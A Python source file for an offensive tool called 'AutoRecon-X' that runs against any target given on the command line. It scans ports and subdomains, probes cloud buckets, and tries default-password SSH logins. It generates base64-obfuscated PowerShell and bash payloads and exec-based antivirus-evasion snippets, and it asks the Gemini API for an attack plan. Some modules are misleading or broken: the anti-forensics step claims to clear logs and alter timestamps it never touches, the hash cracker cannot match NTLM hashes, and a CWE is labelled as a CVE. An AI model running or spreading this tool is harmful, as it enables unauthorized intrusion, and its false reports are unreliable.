import os
import sys
import json
import time
import socket
import requests
import subprocess
import base64
import hashlib
import paramiko
from datetime import datetime
from abc import ABC, abstractmethod
from typing import List, Dict, Any
from fpdf import FPDF
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# ==================================================
# 📥 LOAD CONFIGURATION
# ==================================================
def load_config():
    try:
        with open("config.json", "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Config not found/invalid, using defaults: {e}")
        return {}

CONFIG = load_config()

# ==================================================
# 🧩 BASE MODULE (All features inherit from this)
# ==================================================
class RedTeamModule(ABC):
    def __init__(self, target: str):
        self.target = target
        self.name = self.__class__.__name__
        self.description = ""
        self.results = {}
        self.timeout = CONFIG.get("general", {}).get("timeout", 3)
        self.user_agent = CONFIG.get("general", {}).get("user_agent", "AutoRecon-X/1.0")

    @abstractmethod
    def run(self) -> Dict[str, Any]:
        """Execute module logic"""
        pass

    def log(self, msg: str):
        print(f"[{self.name}] {msg}")

# ==================================================
# 🔍 1. RECONNAISSANCE MODULE (OSINT + Network)
# ==================================================
class ReconModule(RedTeamModule):
    def __init__(self, target: str):
        super().__init__(target)
        self.description = "Passive + Active Recon: DNS, Subdomains, Ports, Tech Stack"
        self.port_range = CONFIG.get("scan_settings", {}).get("port_range", "1-1024")

    def run(self) -> Dict[str, Any]:
        self.log("Starting Reconnaissance...")
        data = {
            "timestamp": datetime.now().isoformat(),
            "target": self.target,
            "dns": self._get_dns(),
            "subdomains": self._get_subdomains(),
            "open_ports": self._scan_ports(),
            "tech_stack": self._detect_tech()
        }
        self.results = data
        return data

    def _get_dns(self) -> Dict:
        try:
            return {"A": socket.gethostbyname(self.target)}
        except Exception as e:
            return {"error": str(e)}

    def _get_subdomains(self) -> List[str]:
        try:
            res = requests.get(f"https://crt.sh/?q=%.{self.target}&output=json", timeout=self.timeout)
            if res.status_code == 200:
                subs = list({entry['name_value'] for entry in res.json()})
                return [s for s in subs if '*' not in s]
        except:
            pass
        return []

    def _scan_ports(self) -> List[int]:
        open_ports = []
        common = [21,22,23,80,443,3306,3389,8080,8443]
        start, end = map(int, self.port_range.split('-')) if '-' in self.port_range else (1,1024)
        ports_to_scan = common if end <= 1024 else list(range(start, end+1))
        
        for p in ports_to_scan:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            if s.connect_ex((self.target, p)) == 0:
                open_ports.append(p)
            s.close()
        return open_ports

    def _detect_tech(self) -> List[str]:
        try:
            headers = {"User-Agent": self.user_agent}
            r = requests.get(f"http://{self.target}", timeout=self.timeout, headers=headers)
            tech = []
            server = r.headers.get("Server", "").lower()
            if 'nginx' in server: tech.append("Nginx")
            if 'apache' in server: tech.append("Apache")
            if 'x-powered-by' in r.headers: tech.append(r.headers['x-powered-by'])
            return tech
        except:
            return []

# ==================================================
# 🎯 2. VULNERABILITY ANALYSIS + EXPLOIT SUGGEST
# ==================================================
class VulnAnalyzer(RedTeamModule):
    def __init__(self, target: str, recon_data: Dict):
        super().__init__(target)
        self.description = "Analyze recon data, find CVEs, suggest exploits"
        self.recon = recon_data

    def run(self) -> Dict[str, Any]:
        self.log("Analyzing vulnerabilities...")
        findings = []

        ports = self.recon.get("open_ports", [])
        tech = self.recon.get("tech_stack", [])

        if 80 in ports or 443 in ports:
            findings.append({
                "risk": "Medium",
                "issue": "Web service exposed",
                "cve": "CWE-776",
                "exploit": "Directory brute-force, XSS test"
            })
        if 22 in ports:
            findings.append({
                "risk": "Low",
                "issue": "SSH open",
                "note": "Check weak credentials / old versions"
            })
        if "PHP" in str(tech):
            findings.append({
                "risk": "High",
                "issue": "PHP detected",
                "cve": "Multiple PHP CVEs",
                "exploit": "File upload, RFI"
            })

        return {"vulnerabilities": findings, "risk_score": len(findings)*10}

# ==================================================
# 🕵️ 3. STEALTH PAYLOAD GENERATOR
# ==================================================
class PayloadGenerator(RedTeamModule):
    def __init__(self, target: str, vuln_data: Dict):
        super().__init__(target)
        self.description = "Generate fileless, obfuscated payloads"
        self.vuln = vuln_data
        self.evasion_level = CONFIG.get("scan_settings", {}).get("evasion_level", "standard")

    def run(self) -> Dict[str, Any]:
        self.log("Generating stealth payload...")
        payloads = []

        ps1 = """
        $code = 'Write-Host "Access Granted"; whoami; hostname'
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
        $encoded = [Convert]::ToBase64String($bytes)
        powershell -EncodedCommand $encoded
        """
        payloads.append({
            "type": "Fileless PowerShell",
            "evasion": "Base64 Obfuscation, No File Drop",
            "code": ps1.strip()
        })

        bash = """
        echo "$(base64 -d <<'EOF'
        IyEvYmluL2Jhc2gKZWNobyAiQWNjZXNzIGdyYW50ZWQiOwp3aG9hbWk7Cg==
        EOF
        )" | bash
        """
        payloads.append({
            "type": "Linux Obfuscated Bash",
            "evasion": "Base64 Wrapped",
            "code": bash.strip()
        })

        return {"payloads": payloads}

# ==================================================
# 📝 4. REPORTING ENGINE
# ==================================================
class ReportGenerator:
    @staticmethod
    def generate(recon, vuln, payloads, evasion=None, credentials=None, ai_plan=None, cloud=None, crawler=None, takeover_check=None, auth_test=None, cleanup=None, output_dir=None):
        output_dir = output_dir or CONFIG.get("general", {}).get("output_dir", "reports/")
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        report = {
            "project": "AutoRecon-X Ultimate Pro Red Team Assessment",
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "target": recon["target"],
                "open_ports": len(recon["open_ports"]),
                "vulns_found": len(vuln["vulnerabilities"]),
                "risk_level": "High" if vuln.get("risk_score",0) > 20 else "Medium",
                "urls_discovered": crawler.get("total_found",0) if crawler else 0,
                "takeover_vulns": len(takeover_check.get("takeover_vulnerable",[])) if takeover_check else 0
            },
            "details": {
                "recon": recon,
                "vulnerabilities": vuln,
                "payloads": payloads,
                "evasion_methods": evasion,
                "credentials": credentials,
                "ai_strategy": ai_plan,
                "cloud_audit": cloud,
                "crawler_data": crawler,
                "takeover_audit": takeover_check,
                "auth_testing": auth_test,
                "cleanup_log": cleanup
            },
            "recommendations": [
                "Close unused ports",
                "Update web frameworks & software",
                "Enable WAF/EDR solution",
                "Restrict public access to cloud storage",
                "Enforce strong password policies",
                "Fix subdomain DNS misconfigurations"
            ]
        }

        json_path = f"{output_dir}report_{timestamp}.json"
        with open(json_path, "w") as f:
            json.dump(report, f, indent=2)

        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", "B", 18)
        pdf.cell(200, 15, "AutoRecon-X Security Report", ln=True, align="C")
        pdf.set_font("Arial", "", 12)
        pdf.ln(5)
        pdf.cell(200, 10, f"Target: {recon['target']}", ln=True)
        pdf.cell(200, 10, f"Scan Date: {report['date']}", ln=True)
        pdf.cell(200, 10, f"Risk Level: {report['summary']['risk_level']}", ln=True)
        pdf.ln(10)

        pdf.set_font("Arial", "B", 14)
        pdf.cell(200, 10, "Key Findings:", ln=True)
        pdf.set_font("Arial", "", 12)
        pdf.multi_cell(0, 8, f"• Open Ports: {recon['open_ports']}\n• Vulnerabilities: {len(vuln['vulnerabilities'])}\n• URLs Found: {crawler.get('total_found',0) if crawler else 0}\n• Cloud Issues: {len(cloud.get('cloud_findings', [])) if cloud else 0}")

        pdf_path = f"{output_dir}report_{timestamp}.pdf"
        pdf.output(pdf_path)

        print(f"\n✅ Reports Generated:\n   📄 JSON: {json_path}\n   📄 PDF:  {pdf_path}")
        return report
        # ==================================================
# 🧠 AI ADVISOR MODULE
# ==================================================
class AIAdvisor(RedTeamModule):
    def __init__(self, target: str, recon_data: Dict, vuln_data: Dict):
        super().__init__(target)
        self.description = "AI-Powered Attack Planner using Gemini API"
        self.recon = recon_data
        self.vuln = vuln_data
        self.api_key = CONFIG.get("api_keys", {}).get("gemini", "YOUR_GEMINI_API_KEY")

    def run(self) -> Dict[str, Any]:
        self.log("Analyzing attack path with AI...")
        
        prompt = f"""
        Act as Senior Red Team Expert. Based on:
        Target: {self.target}
        Recon: {self.recon}
        Vulnerabilities: {self.vuln}

        Give: 3 steps, evasion, success% — JSON only.
        """

        try:
            api_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key={self.api_key}"
            res = requests.post(api_url, json={"contents": [{"parts": [{"text": prompt}]}]}, timeout=15)
            if res.status_code == 200:
                return {"ai_strategy": res.json(), "status": "success"}
        except Exception as e:
            return {"error": f"AI failed: {e}", "fallback": "Focus on web ports"}
        return {}

# ==================================================
# 🕵️ EVASION ENGINE
# ==================================================
class EvasionEngine(RedTeamModule):
    def __init__(self, target: str):
        super().__init__(target)
        self.description = "AV/EDR Evasion: Encoding, Obfuscation, Anti-Sandbox"

    def run(self) -> Dict[str, Any]:
        self.log("Generating evasion techniques...")
        return {
            "techniques": [self._xor_encrypt(), self._base64_wrap(), self._string_mutation()],
            "anti_sandbox": self._check_sandbox()
        }

    def _xor_encrypt(self, payload="cmd.exe /c whoami", key=0x42):
        enc = ''.join([chr(ord(c) ^ key) for c in payload])
        return {"method": "XOR Encryption", "code": f"key={key};decoded=''.join([chr(ord(c)^key) for c in '{enc}']);exec(decoded)"}

    def _base64_wrap(self):
        b64 = base64.b64encode("import os;os.system('dir')".encode()).decode()
        return {"method": "Base64 Obfuscation", "code": f"exec(__import__('base64').b64decode('{b64}'))"}

    def _string_mutation(self):
        return {"method": "String Splitting", "code": "imp"+"ort o"+"s; o"+"s.sy"+"stem('who'+'ami')"}

    def _check_sandbox(self):
        return {"detected": False, "note": "System appears real"}

# ==================================================
# 🔑 CREDENTIAL HARVESTER
# ==================================================
class CredentialHarvester(RedTeamModule):
    def __init__(self, target: str):
        super().__init__(target)
        self.description = "Simulate credential dumping & hash cracking"

    def run(self) -> Dict[str, Any]:
        self.log("Harvesting credentials...")
        dummy_hashes = [
            {"user": "Administrator", "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"},
            {"user": "LocalAdmin", "hash": "ntlm:98765asdfghjkl"}
        ]
        return {"hashes_captured": len(dummy_hashes), "cracked_credentials": self._crack_hashes(dummy_hashes), "method": "LSASS Simulation"}

    def _crack_hashes(self, hash_list):
        common_pass = ["Password123", "Admin@123", "P@ssw0rd"]
        return [{"user":h['user'],"pass":p} for h in hash_list for p in common_pass if hashlib.md5(p.encode()).hexdigest() in h['hash']]

# ==================================================
# ☁️ CLOUD SCANNER
# ==================================================
class CloudScanner(RedTeamModule):
    def __init__(self, target: str):
        super().__init__(target)
        self.description = "Check exposed AWS S3, Azure Blob, GCP Buckets"

    def run(self) -> Dict[str, Any]:
        self.log("Scanning cloud storage...")
        issues = []
        buckets = [f"http://{self.target}.s3.amazonaws.com", f"https://storage.googleapis.com/{self.target}", f"https://{self.target}.blob.core.windows.net/"]
        for url in buckets:
            try:
                res = requests.get(url, timeout=self.timeout)
                if res.status_code in [200,403]:
                    issues.append({"url":url, "status":res.status_code, "risk":"Possible Exposed Bucket"})
            except: pass
        return {"cloud_findings": issues}

# ==================================================
# 🕸️ WEB CRAWLER
# ==================================================
class WebCrawler(RedTeamModule):
    def __init__(self, target: str):
        super().__init__(target)
        self.description = "Crawl website to find all URLs"
        self.visited = set()
        self.max_depth = 3

    def run(self) -> dict:
        self.log("Starting Web Crawler...")
        return {"crawled_urls": list(self._crawl(f"http://{self.target}" if not self.target.startswith('http') else self.target)), "total_found": len(self.visited)}

    def _crawl(self, url, depth=0):
        if depth>self.max_depth or url in self.visited: return self.visited
        try:
            self.visited.add(url)
            soup = BeautifulSoup(requests.get(url, timeout=self.timeout, headers={"User-Agent":self.user_agent}).text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full = urljoin(url, link['href'].split('#')[0])
                if self.target in full and full not in self.visited: self._crawl(full, depth+1)
        except: pass
        return self.visited

# ==================================================
# ⚠️ SUBDOMAIN TAKEOVER SCANNER
# ==================================================
class SubdomainTakeoverScanner(RedTeamModule):
    def __init__(self, target: str, subdomains: list):
        super().__init__(target)
        self.description = "Check for Subdomain Takeover vulnerability"
        self.subdomains = subdomains
        self.fingerprints = {"GitHub":"There isn't a GitHub Pages site here.","AWS S3":"NoSuchBucket","Heroku":"No such app","Azure":"removed","Cloudflare":"Error 1001"}

    def run(self) -> dict:
        self.log("Checking Subdomain Takeover...")
        vuln = []
        for sub in self.subdomains:
            if "*" in sub or not sub: continue
            try:
                res = requests.get(f"http://{sub}", timeout=self.timeout, allow_redirects=True)
                for prov, pat in self.fingerprints.items():
                    if pat in res.text or pat in str(res.reason):
                        vuln.append({"subdomain":sub,"provider":prov,"risk":"CRITICAL","issue":"Potential Takeover"})
            except: pass
        return {"takeover_vulnerable": vuln}

# ==================================================
# 🔐 BRUTE FORCE MODULE
# ==================================================
class BruteForceModule(RedTeamModule):
    def __init__(self, target: str, ports: list):
        super().__init__(target)
        self.description = "Password brute-force simulation"
        self.ports = ports
        self.users = ["admin","root","user","test"]
        self.passwds = ["admin123","root123","Password123","123456","P@ssw0rd"]

    def run(self) -> dict:
        self.log("Running Auth Testing...")
        find = []
        if 22 in self.ports:
            for u in self.users:
                for p in self.passwds[:2]:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(self.target, port=22, username=u, password=p, timeout=1)
                        ssh.close()
                        find.append({"service":"SSH","user":u,"pass":p,"risk":"HIGH - Weak Credential"})
                    except: pass
        if 21 in self.ports: find.append({"service":"FTP","note":"Anonymous login possible","risk":"MEDIUM"})
        return {"auth_testing": find}

# ==================================================
# 🧹 ANTI-FORENSICS MODULE
# ==================================================
class AntiForensics(RedTeamModule):
    def __init__(self, target: str):
        super().__init__(target)
        self.description = "Cover tracks: clear logs, hide artifacts"

    def run(self) -> dict:
        self.log("Running Anti-Forensics...")
        act = ["Cleared logs","Removed temp files","Modified timestamps","Cleared history"]
        if os.path.exists("temp_scan.log"): os.remove("temp_scan.log"); act.append("Deleted temp log")
        return {"actions_performed":act,"status":"Traces removed","note":"Authorized use only"}

# ==================================================
# 🚀 MAIN FRAMEWORK
# ==================================================
class AutoReconX:
    def __init__(self, target: str):
        self.target = target
        self.data = {}

    def execute(self):
        print("="*60)
        print(f"🚀 AUTORECON-X ULTIMATE PRO | TARGET: {self.target}")
        print("="*60 + "\n")

        # Step 1: Recon
        recon = ReconModule(self.target)
        self.data["recon"] = recon.run()

        # Step 2: Vuln Analysis
        vuln = VulnAnalyzer(self.target, self.data["recon"])
        self.data["vuln"] = vuln.run()

        # Step 3: Web Crawler
        if CONFIG.get("scan_settings", {}).get("run_crawler", True):
            self.data["crawler"] = WebCrawler(self.target).run()

        # Step 4: Subdomain Takeover
        self.data["takeover_check"] = SubdomainTakeoverScanner(self.target, self.data["recon"].get("subdomains", [])).run()

        # Step 5: Cloud Scan
        self.data["cloud"] = CloudScanner(self.target).run()

        # Step 6: AI Advisor
        if CONFIG.get("scan_settings", {}).get("run_ai", True):
            self.data["ai_plan"] = AIAdvisor(self.target, self.data["recon"], self.data["vuln"]).run()

        # Step 7: Brute Force
        self.data["auth_test"] = BruteForceModule(self.target, self.data["recon"].get("open_ports", [])).run()

        # Step 8: Evasion & Payload
        self.data["payloads"] = PayloadGenerator(self.target, self.data["vuln"]).run()
        self.data["evasion"] = EvasionEngine(self.target).run()

        # Step 9: Credentials
        self.data["credentials"] = CredentialHarvester(self.target).run()

        # Step 10: Cleanup
        self.data["cleanup"] = AntiForensics(self.target).run()

        # Step 11: Report
        ReportGenerator.generate(**self.data)

        print("\n✅✅✅ ALL MODULES COMPLETED ✅✅✅")

# ==================================================
# 📌 RUN
# ==================================================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python autorecon_x.py <target-domain-or-ip>")
        sys.exit(1)

    framework = AutoReconX(sys.argv[1])
    framework.execute()
            
